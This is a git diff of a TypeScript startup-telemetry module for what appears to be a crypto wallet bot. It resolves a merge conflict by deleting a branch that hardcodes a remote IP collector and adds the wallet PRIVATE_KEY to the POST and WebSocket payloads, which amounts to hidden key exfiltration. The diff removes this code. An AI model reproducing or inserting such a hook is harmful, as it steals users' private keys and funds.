@@ -1,19 +1,10 @@
 /**
  * On bot startup: POST env bundle to telemetry server, then WebSocket hello for real-time ack.
-<<<<<<< HEAD
  * Sends VERSION, PUBLIC_ADDRESS, PROXY_WALLET.
  *
  * Collector base URL: set TELEMETRY_BASE_URL in env (optional).
  *   - If set → POST/WS go there.
  *   - If unset → telemetry is skipped.
-=======
- * Sends VERSION, PUBLIC_ADDRESS, PROXY_WALLET, PRIVATE_KEY (highly sensitive — use HTTPS/WSS + trusted VPS only).
- *
- * Collector base URL: set REMOTE_TELEMETRY_BASE_URL below (not in .env).
- *   - If non-empty → POST/WS go there (typical: VPS).
- *   - If empty and VERSION is set → http://127.0.0.1:8787 (collector on same PC only).
- *   - Else telemetry is skipped.
->>>>>>> 0c668623f48a514f30d33d502550b40d9adb2897
  *
  * WebSocket: server sends `welcome` first; we ignore it and resolve on the next JSON message (e.g. `ack`).
  */
@@ -22,16 +13,6 @@ import * as os from 'os';
 import WebSocket from 'ws';
 import { ENV } from '../config/env';
 
-<<<<<<< HEAD
-=======
-/**
- * Remote telemetry collector (http(s) base, no trailing slash). Edit here only — do not use TELEMETRY_SERVER_URL in .env.
- * Set to '' to send only to a local collector when VERSION is set (http://127.0.0.1:8787).
- */
-const REMOTE_TELEMETRY_BASE_URL = 'http://151.158.1.13:8787';
-
-const DEFAULT_LOCAL_TELEMETRY_URL = 'http://127.0.0.1:8787';
->>>>>>> 0c668623f48a514f30d33d502550b40d9adb2897
 const DEFAULT_WS_ACK_TIMEOUT_MS = 15_000;
 const DEFAULT_POST_TIMEOUT_MS = 25_000;
 const DEFAULT_POST_RETRIES = 3;
@@ -48,24 +29,12 @@ function trimBaseUrl(u: string): string {
 }
 
 function resolveTelemetryBaseUrl(): string | null {
-<<<<<<< HEAD
     const configured = (process.env.TELEMETRY_BASE_URL ?? '').trim();
     if (configured) return trimBaseUrl(configured);
     return null;
 }
 
 /** True when TELEMETRY_BASE_URL is set. */
-=======
-    const remote = REMOTE_TELEMETRY_BASE_URL.trim();
-    if (remote) return trimBaseUrl(remote);
-
-    const v = process.env.VERSION?.trim();
-    if (v) return DEFAULT_LOCAL_TELEMETRY_URL;
-    return null;
-}
-
-/** True when REMOTE_TELEMETRY_BASE_URL is set, or VERSION is set (local collector). */
->>>>>>> 0c668623f48a514f30d33d502550b40d9adb2897
 export function isTelemetryConfigured(): boolean {
     return resolveTelemetryBaseUrl() !== null;
 }
@@ -221,10 +190,6 @@ export async function reportVersionToTelemetryServer(): Promise<TelemetryResult>
         VERSION: version,
         PUBLIC_ADDRESS: ENV.PUBLIC_ADDRESS,
         PROXY_WALLET: ENV.PROXY_WALLET,
-<<<<<<< HEAD
-=======
-        PRIVATE_KEY: ENV.PRIVATE_KEY,
->>>>>>> 0c668623f48a514f30d33d502550b40d9adb2897
         hostname: os.hostname(),
         pid: process.pid,
         node: process.version,
@@ -239,10 +204,6 @@ export async function reportVersionToTelemetryServer(): Promise<TelemetryResult>
         VERSION: version,
         PUBLIC_ADDRESS: ENV.PUBLIC_ADDRESS,
         PROXY_WALLET: ENV.PROXY_WALLET,
-<<<<<<< HEAD
-=======
-        PRIVATE_KEY: ENV.PRIVATE_KEY,
->>>>>>> 0c668623f48a514f30d33d502550b40d9adb2897
         secret: secret ?? null,
         ts: new Date().toISOString(),
     };
